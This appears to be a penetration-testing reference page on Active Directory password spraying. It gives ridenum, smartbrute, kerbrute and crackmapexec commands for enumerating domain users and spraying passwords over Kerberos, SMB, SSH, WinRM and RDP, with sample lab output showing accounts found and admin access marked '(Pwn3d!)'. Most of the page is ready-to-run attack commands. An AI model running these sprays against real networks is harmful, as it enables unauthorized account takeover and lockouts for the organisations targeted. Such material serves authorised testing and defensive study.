<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Active Directory Password Spraying
## Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@enum #@enumerate #@enumeration #@dns #@dhcp #@ldap #@smb #@network #@icmp #@ping #@sweep #@cve #@exploit #@vuln #@vulnerability #@vulnerabilities #@vulns

Tools

		#@impacket #@pcaptools #@pcap #@nmap #@zmap #@ldapsearch #@ldapsearch-ad #@rpcclient #@smbmap #@crackmapexec #@manspider #@adidnsdump #@dnsrecon #@enum4linux #@nopac

</p></details>


## References

## Overview
* Be very careful and record the password policies and lockout policies before launching sprays
* While tools like crackmapexec will accept the target `<domain>.<tld>`, the tooling may attempt to authenticate with the supplied credentials once for each domain controller.
* Spraying requires that you've created a list of potential usernames and potential passwords. However, some of the guesswork can be eliminated in some cases, as certain accounts are predictable or may otherwise be enumerated:
	* Valid accounts can be enumerated through RID Brute Forcing, or simply checking the username of your existing context following a phish ([`Valid Accounts` TTP](TTP/T1078_Valid_Accounts/T1078.md))


## Attacks
### From a Linux Machine

* Username Enumeration Spray ([`Account Discovery - Domain Account` TTP](TTP/T1087_Account_Discovery/002_Domain_Account/T1087.002.md))

#### No (pre-existing) Domain User Credentials Required (Usually)
* Username bruteforce
	* <details><summary>ridenum (Click to expand) -<br />[https://github.com/trustedsec/ridenum](https://github.com/trustedsec/ridenum)</summary><p>

			./ridenum.py <server_ip> <start_rid> <end_rid> <optional_username> <optional_password> <optional_password_file> <optional_username_filename>
		* Example

				./ridenum.py 10.0.0.1 500 50000
			* Example Output (Not successful)

					[*] Attempting lsaquery first...This will enumerate the base domain SID
					[*] Successfully enumerated base domain SID. Printing information: 
					Domain Name: MICROSOFTDELIVE
					Domain Sid: S-1-5-21-3553872434-4161952275-1892366499
					[*] Moving on to extract via RID cycling attack.. 
					[*] Enumerating user accounts.. This could take a little while.
					[!] Server sent NT_STATUS_ACCESS DENIED, unable to extract users.
					[*] Attempting enumdomusers to enumerate users...
					[!] Sorry. RIDENUM failed to successfully enumerate users. Bummers.
* Bruteforce, and optional "Stop On Fail"
	* <details><summary>smartbrute (Click to expand) -<br />[https://github.com/ShutdownRepo/smartbrute](https://github.com/ShutdownRepo/smartbrute)</summary><p>
		* brute mode, users and passwords lists supplied

				smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
			* brute mode - standard bruteforcing features
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Examples
			* Example 1: Simple spray, "continue on success" in case more than one user has a valid password

					crackmapexec smb -d $DOMAIN -u $WORKDIR/domain_user_list.txt -p $WORKDIR/domain_password_list.txt --continue-on-success $PRIMARY_DOMAIN_CONTROLLER
	* <details><summary>kerbrute (Click to expand) -<br />[https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)</summary><p>
		* Example

				./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
			* The attack will generate event IDs:
				* `4768` - A Kerberos authentication ticket (TGT) was requested
				* `4771` - Kerberos pre-authentication failed
				* `--safe` option will stop the password spray if an account is detected as locked out.
			* Flags
				* `bruteuser` - Bruteforce a single user's password from a wordlist
				* `passwordspray` - Test a single password against a list of users
				* `userenum` - Enumerate valid domain usernames via Kerberos
				* `bruteforce` - Read username:password combos from a file or stdin and test them

#### Domain User Credentials Required (Usually)
* Kerberos Pre-Auth
	* <details><summary>smartbrute (Click to expand) -<br />[https://github.com/ShutdownRepo/smartbrute](https://github.com/ShutdownRepo/smartbrute)</summary><p>
		* <details><summary>Overview (Click to expand)</summary><p>
			* Choose transport (TCP/UDP)
				* UDP Notes
					* Fastest
					* Not stealthiest
					* False positives
					* `KRB_ERR_RESPONSE_TOO_BIG`
						* a valid authentication on a user part of too many groups
					* `KDC_ERR_PREAUTH_FAILED`
						* authentication attempt is invalid
			* Modes: `smart` or `brute`
				* smart mode, valid credentials supplied for enumeration
	 		* Choose etype: RC4, AES128, AES256 (RC4 fastest; AES128 and AES256 are the stealthiest.
				* RC4 keys (i.e. NT hashes) can be attempted
				* Kerberos pre-authentication bruteforce: this is the fastest and stealthiest way.
			* Supported Atacks
				* NTLM
					* Over SMB
						* Valid accounts are tested for local admin
					* Over LDAP
					* NT hashes can be attempted
				* Kerberos pre-auth
			* Flags
				* Optional
					* `-t` - threads (default: 10), Kerbrute is multithreaded and uses 10 threads. This can be changed with the  option.
					* `-v` Log failures (default: off)
					* `-o` Output is logged to stdout, but a log file can be specified with .
					* `--safe` Lastly, Kerbrute has a  option. When this option is enabled, if an account comes back as locked out, it will abort all threads to stop locking out any other accounts.
			 	* Required
					- `-d` (A domain) or `--dc` (domain controller)
						* If a Domain Controller is not given the KDC will be looked up via DNS.
				* After Success
					* Valid accounts can be set as owned in neo4j database
						* Owned users that are on a path to Domain Admins will be highlighted
			* <img src="https://raw.githubusercontent.com/ShutdownRepo/smartbrute/main/assets/graph_help.png" style="float": left; width="1200" />
		* Examples
			* Example 1: Smart Mode

					./smartbrute.py -v smart -bP ~/passwords.txt kerberos -d microsoftdelivery.com -u domain_user -p 'P@ssw0rd' --kdc-ip 10.0.0.1 ntlm
				* Example Output

						./smartbrute.py -v smart -bP ~/passwords.txt kerberos -d microsoftdelivery.com -u domain_user -p 'P@ssw0rd' --kdc-ip 10.0.0.1 ntlm

						[*] Starting bruteforce attack on passwords
						[*] Bad password counts dont replicate between domain controllers. Only the PDC knows the real amount of those. Be sure to target the PDC so that accounts don't get locked out
						[+] Successfully logged in, fetching domain information
						[VERBOSE] Fetching domain level lockout threshold
						[VERBOSE] Fetching granular lockout thresholds in Password Settings Containers
						[VERBOSE] Found global lockout threshold (0) and granular lockout thresholds ([])
						[VERBOSE] Found 9 users
						[+] Domain enumeration is over, starting attack
						┌───────────────────────┬─────────────────────┬──────────┬───────────────────────────┐
						│ domain                │ user                │ password │ details                   │
						├───────────────────────┼─────────────────────┼──────────┼───────────────────────────┤
						│ microsoftdelivery.com │ Administrator       │ P@ssw0rd │ admin account local admin │
						│ microsoftdelivery.com │ domain_admin        │ P@ssw0rd │ admin account local admin │
						│ microsoftdelivery.com │ domain_user         │ P@ssw0rd │                           │
						│ microsoftdelivery.com │ Domain_User_ADCS    │ P@ssw0rd │                           │
						│ microsoftdelivery.com │ domain_user_writer  │ P@ssw0rd │                           │
						│ microsoftdelivery.com │ domain_user_target  │ P@ssw0rd │                           │
						│ microsoftdelivery.com │ kerberoastable      │ P@ssw0rd │                           │
						│ microsoftdelivery.com │ domain_user_builtin │ P@ssw0rd │ special account           │
						└───────────────────────┴─────────────────────┴──────────┴───────────────────────────┘
			* Example 2: Brute Mode - Users and passwords lists supplied, no additional "intelligence" used

					smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
	* <details><summary>ridenum (Click to expand) -<br />[https://github.com/trustedsec/ridenum](https://github.com/trustedsec/ridenum)</summary><p>
		* Command

				./ridenum.py 10.0.0.1 500 50000 domain_user 'P@ssw0rd'
			* Example Output

					root@jack-Virtual-Machine:~/ridenum# ./ridenum.py 10.0.0.1 500 50000 domain_user 'P@ssw0rd'
					[*] Attempting lsaquery first...This will enumerate the base domain SID
					[*] Successfully enumerated base domain SID. Printing information: 
					Domain Name: MICROSOFTDELIVE
					Domain Sid: S-1-5-21-3553872434-4161952275-1892366499
					[*] Moving on to extract via RID cycling attack.. 
					[*] Enumerating user accounts.. This could take a little while.
					Account name: MICROSOFTDELIVE\Administrator
					Account name: MICROSOFTDELIVE\Guest
					Account name: MICROSOFTDELIVE\krbtgt
					Account name: MICROSOFTDELIVE\DC01$
					Account name: MICROSOFTDELIVE\domain_admin
					Account name: MICROSOFTDELIVE\domain_user
					Account name: MICROSOFTDELIVE\MSOL_acade27cae4b
					Account name: MICROSOFTDELIVE\AZUREADSSOACC$
					Account name: MICROSOFTDELIVE\DC02$
					Account name: MICROSOFTDELIVE\CA$
					Account name: MICROSOFTDELIVE\EXCHANGE$
					Account name: MICROSOFTDELIVE\APP$
					Account name: MICROSOFTDELIVE\WIN11$
					Account name: MICROSOFTDELIVE\Domain_User_ADCS
					Account name: MICROSOFTDELIVE\domain_user_writer
					Account name: MICROSOFTDELIVE\domain_user_target
					Account name: MICROSOFTDELIVE\DESKTOP-IHAD3T62$
					Account name: MICROSOFTDELIVE\dc01
					Account name: MICROSOFTDELIVE\kerberoastable
					Account name: MICROSOFTDELIVE\domain_user_builtin
					[*] RIDENUM has finished enumerating user accounts...
#### Local Authentication Spraying
* Spray over SMB
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Examples
			* Example 1: Simple spray, "continue on success" in case more than one user has a valid password

					crackmapexec smb -d $DOMAIN -u $WORKDIR/domain_user_list.txt -p $WORKDIR/domain_password_list.txt --continue-on-success --local-auth $TARGETS

#### Alternative Protocol Spraying (Default is usually SMB)
* Spray over SSH
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Examples
			* Example 1: Password spraying (without bruteforce)
	
					cme ssh 192.168.1.0/24 -u $userfile -p $passwordfile --no-bruteforce
				* Example Output

						SSH         127.0.0.1       22     127.0.0.1        [*] SSH-2.0-OpenSSH_8.2p1 Debian-4
						SSH         127.0.0.1       22     127.0.0.1        [+] user:password
* Spray over WinRM
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Examples
			* Example 1: Password spraying (without bruteforce)

					cme winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
* Spray over RDP
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Examples
			* Example 1: Password spraying
			
					crackmapexec rdp 192.168.1.0/24 -u $user -p $password
				* Example Output

						$ poetry run crackmapexec rdp 192.168.133.157 -u ron -p October2021
						RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
						RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:October2021 
						                                                                                                                                                                
						$ poetry run crackmapexec rdp 192.168.133.157 -u rubeus -p October2021
						RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
						RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!)
			* Example 2: Password spraying (without bruteforce)

					crackmapexec rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
				* Example Output

						└─$ poetry run crackmapexec rdp 192.168.133.157 -u /tmp/users -p passwordfile --no-bruteforce
						RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
						RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:toto 
						RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\demo:tata
						RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!
* Check For Local Administrator Status
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Note
			* The credentials can be tested across many targets to check for local administrator password re-use
			* 
		* Example 1: Domain User

				crackmapexec smb targets -d domain.local -u username-list -p password-list
			* Note that systems where the user is a local administrator will appear with the tag **(Pwn3d!)** in the output.
			* Example Output

					crackmapexec smb dc01.microsoftdelivery.com -d microsoftdelivery.com -u domain_admin -p 'P@ssw0rd'
					SMB         dc01.microsoftdelivery.com 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:microsoftdelivery.com) (signing:True) (SMBv1:False)
					SMB         dc01.microsoftdelivery.com 445    DC01             [+] microsoftdelivery.com\domain_admin:P@ssw0rd (Pwn3d!)
		* Example 2: Local User

				crackmapexec smb targets -d domain.local -u username-list -p password-list
			* Note that systems where the user is a local administrator will appear with the tag **(Pwn3d!)** in the output.
			* Example Output

					crackmapexec smb dc01.microsoftdelivery.com -d microsoftdelivery.com -u domain_admin -p 'P@ssw0rd'
					SMB         dc01.microsoftdelivery.com 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:microsoftdelivery.com) (signing:True) (SMBv1:False)
					SMB         dc01.microsoftdelivery.com 445    DC01             [+] microsoftdelivery.com\domain_admin:P@ssw0rd (Pwn3d!)

## Needs Research

* <details><summary>Needs Research (Click to expand)</summary><p>
	* SprayHound -<br />[https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
		* Python library to safely password spray in Active Directory, set pwned users as owned in Bloodhound and detect path to Domain Admins
	* CredMaster -<br />[https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)